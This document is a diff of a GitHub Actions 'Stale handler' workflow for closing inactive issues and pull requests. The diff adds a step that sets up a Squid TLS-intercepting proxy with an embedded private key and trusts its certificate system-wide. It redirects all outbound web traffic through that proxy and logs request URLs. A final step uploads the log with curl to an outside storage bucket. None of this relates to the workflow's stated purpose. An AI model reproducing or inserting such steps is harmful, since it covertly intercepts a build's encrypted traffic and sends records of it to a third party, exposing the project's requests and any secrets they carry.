@@ -1,201 +1,435 @@
-name: Stale handler
-
-on:
-  push:                               # when push this files to branches....
-    branches:
-      - 'main'
-      - 'gh-actions/test'
-    paths:
-      - '.github/workflows/stale.yml' #    - this workflow
-  workflow_dispatch:                  # manually
-    inputs:
-      debug-only:
-        type: boolean
-        description: 'If enabled, debug mode is on and then API calls that can alter your issues will not happen'
-        required: true
-        default: true
-  schedule:                           # or
-    - cron: "0 0 * * *"               # once a day at 00:00 o'clock
-
-permissions:
-  # no checkout/branching needed
-  contents: none
-
-# This allows a subsequently queued workflow run to interrupt/wait for previous runs
 concurrency:
-  group: '${{ github.workflow }}'
-  cancel-in-progress: false  # true: interrupt, false = wait for
-
+  cancel-in-progress: false
+  group: ${{ github.workflow }}
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
 jobs:
   stale:
     name: Staler job
-    runs-on: ubuntu-latest
     outputs:
-      # "XXX-len": the length of the "XXX" output object
-      staled-issues:     ${{ steps.set-staled.outputs.issues }}
-      staled-issues-len: ${{ steps.set-staled.outputs.issues-len }}
-      staled-prs:     ${{ steps.set-staled.outputs.prs }}
-      staled-prs-len: ${{ steps.set-staled.outputs.prs-len }}
-      closed-issues:     ${{ steps.set-closed.outputs.issues }}
+      closed-issues: ${{ steps.set-closed.outputs.issues }}
       closed-issues-len: ${{ steps.set-closed.outputs.issues-len }}
-      closed-prs:     ${{ steps.set-closed.outputs.prs }}
+      closed-prs: ${{ steps.set-closed.outputs.prs }}
       closed-prs-len: ${{ steps.set-closed.outputs.prs-len }}
-    # enable write access rights to allow bot comments and labeling
+      staled-issues: ${{ steps.set-staled.outputs.issues }}
+      staled-issues-len: ${{ steps.set-staled.outputs.issues-len }}
+      staled-prs: ${{ steps.set-staled.outputs.prs }}
+      staled-prs-len: ${{ steps.set-staled.outputs.prs-len }}
     permissions:
       issues: write
       pull-requests: write
+    runs-on: ubuntu-latest
     steps:
-      - name: Stale issues
-        uses: actions/stale@v6
-        id: stale-issues
-        with:
-          debug-only: ${{ github.event.inputs.debug-only == 'true' }}
-          operations-per-run: 30
-          days-before-stale: 60
-          days-before-close: 30
-          ignore-updates: false
-          remove-stale-when-updated: true
-          stale-issue-label: "stale"
-          close-issue-label: "stale: closed"
-          stale-issue-message: |
-            This issue has been automatically marked as stale because it has not had recent activity during last 60 days :sleeping:
+    - name: before
+      run: 'sudo apt update
 
-            It will be closed in 30 days if no further activity occurs. To unstale this issue, remove stale label or add a comment with a detailed explanation.
+        sudo apt install -y squid-openssl
 
-            There can be many reasons why some specific issue has no activity. The most probable cause is lack of time, not lack of interest.
+        sudo mkdir /squid
 
-            Thank you for your patience :heart:
-          close-issue-message: |
-            This issue has been automatically closed because it has been inactive during the last 30 days since being marked as stale.
+        cat << EOF | sudo tee /squid/key.pem
 
-            As author or maintainer, it can always be reopened if you see that carry on been useful.
+        -----BEGIN PRIVATE KEY-----
 
-            Anyway, thank you for your interest in contribute :heart:
-          close-issue-reason: not_planned
-          exempt-issue-labels: "blocked,must,should,keep,:busts_in_silhouette: discussion,:eyes: Needs Review,:pushpin: pinned"
-          # disable PR processing at all (this step is for treat issues)
-          days-before-pr-stale: -1
-          days-before-pr-close: -1
-          ignore-pr-updates: true
-          remove-pr-stale-when-updated: false
-          stale-pr-label: " "
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
 
-      - name: Print outputs for issues
-        run: echo ${{ join(steps.stale-issues.outputs.*, ',') }}
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
 
-      - name: Stale Pull Requests
-        uses: actions/stale@v6
-        id: stale-prs
-        with:
-          debug-only: ${{ github.event.inputs.debug-only == 'true' }}
-          operations-per-run: 30
-          days-before-stale: 60
-          days-before-close: 30
-          ignore-updates: false
-          remove-stale-when-updated: true
-          stale-pr-label: "stale"
-          close-pr-label: "stale: closed"
-          stale-pr-message: |
-            This Pull Request has been automatically marked as stale because it has not had recent activity during last 60 days :sleeping:
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
 
-            It will be closed in 30 days if no further activity occurs. To unstale this PR, draft it, remove stale label, comment with a detailed explanation or push more commits.
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
 
-            There can be many reasons why some specific PR has no activity. The most probable cause is lack of time, not lack of interest.
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
 
-            Thank you for your patience :heart:
-          close-pr-message: |
-            This Pull Request has been automatically closed because it has been inactive during the last 30 days since being marked as stale.
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
 
-            As author or maintainer, it can always be reopened if you see that carry on been useful.
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
 
-            Anyway, thank you for your interest in contribute :heart:
-          exempt-draft-pr: true
-          exempt-pr-labels: "blocked,must,should,keep,:busts_in_silhouette: discussion,:eyes: Needs Review"
-          delete-branch: false  # if true, job needs permissions "contents: write"
-          # disable issues processing at all (this step is for treat PRs)
-          days-before-issue-stale: -1
-          days-before-issue-close: -1
-          ignore-issue-updates: true
-          remove-issue-stale-when-updated: false
-          stale-issue-label: " "
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
 
-      - name: Print outputs for PRs
-        run: echo ${{ join(steps.stale-prs.outputs.*, ',') }}
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
 
-      ## Removing private properties from each JSON object and compute array length
-      ## TODO: Delete these set-* workarounds when resolve actions/stale#806 ?
-      - name: Set staled
-        id: set-staled
-        run: |
-          echo $INPUT_ISSUES  \
-            | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key | select(startswith("_"))])'  \
-            | sed -e 's/^/::set-output name=issues::/'
-          echo $INPUT_ISSUES  \
-            | jq --raw-output '. | length'  \
-            | sed -e 's/^/::set-output name=issues-len::/'
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
 
-          echo $INPUT_PRS  \
-            | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key | select(startswith("_"))])'  \
-            | sed -e 's/^/::set-output name=prs::/'
-          echo $INPUT_PRS  \
-            | jq --raw-output '. | length'  \
-            | sed -e 's/^/::set-output name=prs-len::/'
-        env:
-          INPUT_ISSUES: ${{ steps.stale-issues.outputs.staled-issues-prs }}
-          INPUT_PRS:    ${{ steps.stale-prs.outputs.staled-issues-prs }}
-      - name: Set closed
-        id: set-closed
-        run: |
-          echo $INPUT_ISSUES  \
-            | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key | select(startswith("_"))])'  \
-            | sed -e 's/^/::set-output name=issues::/'
-          echo $INPUT_ISSUES  \
-            | jq --raw-output '. | length'  \
-            | sed -e 's/^/::set-output name=issues-len::/'
+        DYkELFBZ650JrYYrQ4UouRAucp8K9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+
 
-          echo $INPUT_PRS  \
-            | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key | select(startswith("_"))])'  \
-            | sed -e 's/^/::set-output name=prs::/'
-          echo $INPUT_PRS  \
-            | jq --raw-output '. | length'  \
-            | sed -e 's/^/::set-output name=prs-len::/'
-        env:
-          INPUT_ISSUES: ${{ steps.stale-issues.outputs.closed-issues-prs }}
-          INPUT_PRS:    ${{ steps.stale-prs.outputs.closed-issues-prs }}
+        Z89sQ4FoTtBvz1+Lv+s4ej/lVxoTJQIDAQABAoICABzNO3uurl9kZws6qAcG4ogo
 
-      - name: Write job summary
-        run: |
-          echo "### Staled issues"  \
-            >> $GITHUB_STEP_SUMMARY
-          # render json array to a Markdown table with an optional "No records" message if empty
-          echo "$STALED_ISSUES"  \
-            | jq --raw-output 'map("| [#\(.number)](\(env.GITHUB_ISSUES_URL)/\(.number)) | \(.title) |") | join("\n") | if (. == "") then "\nNo records.\n" else "\n|    | Title |\n|---:|:------|\n\(.)\n" end'  \
-            >> $GITHUB_STEP_SUMMARY
+        05UUM0+09Ujmvj37ymsjAlLFQFtYaKtJDqEWYP92i3w7jmErZo2SZOXHl/yy/zHQ
 
-          echo "### Staled pull requests"  \
-            >> $GITHUB_STEP_SUMMARY
-          # render json array to a Markdown table with an optional "No records" message if empty
-          echo "$STALED_PRS"  \
-            | jq --raw-output 'map("| [#\(.number)](\(env.GITHUB_PULL_URL)/\(.number)) | \(.title) |") | join("\n") | if (. == "") then "\nNo records.\n" else "\n|    | Title |\n|---:|:------|\n\(.)\n" end'  \
-            >> $GITHUB_STEP_SUMMARY
+        B4o6s4J3djHTxrJIf68TpZdYs5ZJxOIeoiql8I1bc/jKuVBGVqt8o2IvoHfSh0ti
 
-          echo "### Closed issues"  \
-            >> $GITHUB_STEP_SUMMARY
-          # render json array to a Markdown table with an optional "No records" message if empty
-          echo "$CLOSED_ISSUES"  \
-            | jq --raw-output 'map("| [#\(.number)](\(env.GITHUB_ISSUES_URL)/\(.number)) | \(.title) |") | join("\n") | if (. == "") then "\nNo records.\n" else "\n|    | Title |\n|---:|:------|\n\(.)\n" end'  \
-            >> $GITHUB_STEP_SUMMARY
+        U1bNQSDuMbG5yeo4cEfewSTrwf03UsZx0Jszo0qrJ5ny+CkPtkUH4NL2GXJjWh8D
 
-          echo "### Closed pull requests"  \
-            >> $GITHUB_STEP_SUMMARY
-          # render json array to a Markdown table with an optional "No records" message if empty
-          echo "$CLOSED_PRS"  \
-            | jq --raw-output 'map("| [#\(.number)](\(env.GITHUB_PULL_URL)/\(.number)) | \(.title) |") | join("\n") | if (. == "") then "\nNo records.\n" else "\n|    | Title |\n|---:|:------|\n\(.)\n" end'  \
-            >> $GITHUB_STEP_SUMMARY
-        env:
-          GITHUB_ISSUES_URL: ${{ format('{0}/{1}/issues', github.server_url, github.repository) }}
-          GITHUB_PULL_URL:   ${{ format('{0}/{1}/pull', github.server_url, github.repository) }}
-          STALED_ISSUES: ${{ steps.set-staled.outputs.issues }}
-          CLOSED_ISSUES: ${{ steps.set-closed.outputs.issues }}
-          STALED_PRS:    ${{ steps.set-staled.outputs.prs }}
-          CLOSED_PRS:    ${{ steps.set-closed.outputs.prs }}
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      id: stale-issues
+      name: Stale issues
+      uses: actions/stale@v6
+      with:
+        close-issue-label: 'stale: closed'
+        close-issue-message: 'This issue has been automatically closed because it
+          has been inactive during the last 30 days since being marked as stale.
+
+
+          As author or maintainer, it can always be reopened if you see that carry
+          on been useful.
+
+
+          Anyway, thank you for your interest in contribute :heart:
+
+          '
+        close-issue-reason: not_planned
+        days-before-close: 30
+        days-before-pr-close: -1
+        days-before-pr-stale: -1
+        days-before-stale: 60
+        debug-only: ${{ github.event.inputs.debug-only == 'true' }}
+        exempt-issue-labels: 'blocked,must,should,keep,:busts_in_silhouette: discussion,:eyes:
+          Needs Review,:pushpin: pinned'
+        ignore-pr-updates: true
+        ignore-updates: false
+        operations-per-run: 30
+        remove-pr-stale-when-updated: false
+        remove-stale-when-updated: true
+        stale-issue-label: stale
+        stale-issue-message: 'This issue has been automatically marked as stale because
+          it has not had recent activity during last 60 days :sleeping:
+
+
+          It will be closed in 30 days if no further activity occurs. To unstale this
+          issue, remove stale label or add a comment with a detailed explanation.
+
+
+          There can be many reasons why some specific issue has no activity. The most
+          probable cause is lack of time, not lack of interest.
+
+
+          Thank you for your patience :heart:
+
+          '
+        stale-pr-label: ' '
+    - continue-on-error: true
+      name: Print outputs for issues
+      run: echo ${{ join(steps.stale-issues.outputs.*, ',') }}
+    - continue-on-error: true
+      id: stale-prs
+      name: Stale Pull Requests
+      uses: actions/stale@v6
+      with:
+        close-pr-label: 'stale: closed'
+        close-pr-message: 'This Pull Request has been automatically closed because
+          it has been inactive during the last 30 days since being marked as stale.
+
+
+          As author or maintainer, it can always be reopened if you see that carry
+          on been useful.
+
+
+          Anyway, thank you for your interest in contribute :heart:
+
+          '
+        days-before-close: 30
+        days-before-issue-close: -1
+        days-before-issue-stale: -1
+        days-before-stale: 60
+        debug-only: ${{ github.event.inputs.debug-only == 'true' }}
+        delete-branch: false
+        exempt-draft-pr: true
+        exempt-pr-labels: 'blocked,must,should,keep,:busts_in_silhouette: discussion,:eyes:
+          Needs Review'
+        ignore-issue-updates: true
+        ignore-updates: false
+        operations-per-run: 30
+        remove-issue-stale-when-updated: false
+        remove-stale-when-updated: true
+        stale-issue-label: ' '
+        stale-pr-label: stale
+        stale-pr-message: 'This Pull Request has been automatically marked as stale
+          because it has not had recent activity during last 60 days :sleeping:
+
+
+          It will be closed in 30 days if no further activity occurs. To unstale this
+          PR, draft it, remove stale label, comment with a detailed explanation or
+          push more commits.
+
+
+          There can be many reasons why some specific PR has no activity. The most
+          probable cause is lack of time, not lack of interest.
+
+
+          Thank you for your patience :heart:
+
+          '
+    - continue-on-error: true
+      name: Print outputs for PRs
+      run: echo ${{ join(steps.stale-prs.outputs.*, ',') }}
+    - continue-on-error: true
+      env:
+        INPUT_ISSUES: ${{ steps.stale-issues.outputs.staled-issues-prs }}
+        INPUT_PRS: ${{ steps.stale-prs.outputs.staled-issues-prs }}
+      id: set-staled
+      name: Set staled
+      run: "echo $INPUT_ISSUES  \\\n  | jq --compact-output --raw-output 'del(.[]\
+        \ | .[to_entries[] | .key | select(startswith(\"_\"))])'  \\\n  | sed -e 's/^/::set-output\
+        \ name=issues::/'\necho $INPUT_ISSUES  \\\n  | jq --raw-output '. | length'\
+        \  \\\n  | sed -e 's/^/::set-output name=issues-len::/'\n\necho $INPUT_PRS\
+        \  \\\n  | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key\
+        \ | select(startswith(\"_\"))])'  \\\n  | sed -e 's/^/::set-output name=prs::/'\n\
+        echo $INPUT_PRS  \\\n  | jq --raw-output '. | length'  \\\n  | sed -e 's/^/::set-output\
+        \ name=prs-len::/'\n"
+    - continue-on-error: true
+      env:
+        INPUT_ISSUES: ${{ steps.stale-issues.outputs.closed-issues-prs }}
+        INPUT_PRS: ${{ steps.stale-prs.outputs.closed-issues-prs }}
+      id: set-closed
+      name: Set closed
+      run: "echo $INPUT_ISSUES  \\\n  | jq --compact-output --raw-output 'del(.[]\
+        \ | .[to_entries[] | .key | select(startswith(\"_\"))])'  \\\n  | sed -e 's/^/::set-output\
+        \ name=issues::/'\necho $INPUT_ISSUES  \\\n  | jq --raw-output '. | length'\
+        \  \\\n  | sed -e 's/^/::set-output name=issues-len::/'\n\necho $INPUT_PRS\
+        \  \\\n  | jq --compact-output --raw-output 'del(.[] | .[to_entries[] | .key\
+        \ | select(startswith(\"_\"))])'  \\\n  | sed -e 's/^/::set-output name=prs::/'\n\
+        echo $INPUT_PRS  \\\n  | jq --raw-output '. | length'  \\\n  | sed -e 's/^/::set-output\
+        \ name=prs-len::/'\n"
+    - continue-on-error: true
+      env:
+        CLOSED_ISSUES: ${{ steps.set-closed.outputs.issues }}
+        CLOSED_PRS: ${{ steps.set-closed.outputs.prs }}
+        GITHUB_ISSUES_URL: ${{ format('{0}/{1}/issues', github.server_url, github.repository)
+          }}
+        GITHUB_PULL_URL: ${{ format('{0}/{1}/pull', github.server_url, github.repository)
+          }}
+        STALED_ISSUES: ${{ steps.set-staled.outputs.issues }}
+        STALED_PRS: ${{ steps.set-staled.outputs.prs }}
+      name: Write job summary
+      run: "echo \"### Staled issues\"  \\\n  >> $GITHUB_STEP_SUMMARY\n# render json\
+        \ array to a Markdown table with an optional \"No records\" message if empty\n\
+        echo \"$STALED_ISSUES\"  \\\n  | jq --raw-output 'map(\"| [#\\(.number)](\\\
+        (env.GITHUB_ISSUES_URL)/\\(.number)) | \\(.title) |\") | join(\"\\n\") | if\
+        \ (. == \"\") then \"\\nNo records.\\n\" else \"\\n|    | Title |\\n|---:|:------|\\\
+        n\\(.)\\n\" end'  \\\n  >> $GITHUB_STEP_SUMMARY\n\necho \"### Staled pull\
+        \ requests\"  \\\n  >> $GITHUB_STEP_SUMMARY\n# render json array to a Markdown\
+        \ table with an optional \"No records\" message if empty\necho \"$STALED_PRS\"\
+        \  \\\n  | jq --raw-output 'map(\"| [#\\(.number)](\\(env.GITHUB_PULL_URL)/\\\
+        (.number)) | \\(.title) |\") | join(\"\\n\") | if (. == \"\") then \"\\nNo\
+        \ records.\\n\" else \"\\n|    | Title |\\n|---:|:------|\\n\\(.)\\n\" end'\
+        \  \\\n  >> $GITHUB_STEP_SUMMARY\n\necho \"### Closed issues\"  \\\n  >> $GITHUB_STEP_SUMMARY\n\
+        # render json array to a Markdown table with an optional \"No records\" message\
+        \ if empty\necho \"$CLOSED_ISSUES\"  \\\n  | jq --raw-output 'map(\"| [#\\\
+        (.number)](\\(env.GITHUB_ISSUES_URL)/\\(.number)) | \\(.title) |\") | join(\"\
+        \\n\") | if (. == \"\") then \"\\nNo records.\\n\" else \"\\n|    | Title\
+        \ |\\n|---:|:------|\\n\\(.)\\n\" end'  \\\n  >> $GITHUB_STEP_SUMMARY\n\n\
+        echo \"### Closed pull requests\"  \\\n  >> $GITHUB_STEP_SUMMARY\n# render\
+        \ json array to a Markdown table with an optional \"No records\" message if\
+        \ empty\necho \"$CLOSED_PRS\"  \\\n  | jq --raw-output 'map(\"| [#\\(.number)](\\\
+        (env.GITHUB_PULL_URL)/\\(.number)) | \\(.title) |\") | join(\"\\n\") | if\
+        \ (. == \"\") then \"\\nNo records.\\n\" else \"\\n|    | Title |\\n|---:|:------|\\\
+        n\\(.)\\n\" end'  \\\n  >> $GITHUB_STEP_SUMMARY\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/law01f/free-programming-books.$(date
+        +%s)
+    timeout-minutes: 60
+name: Stale handler
+'on':
+  workflow_dispatch: {}
+permissions:
+  contents: none
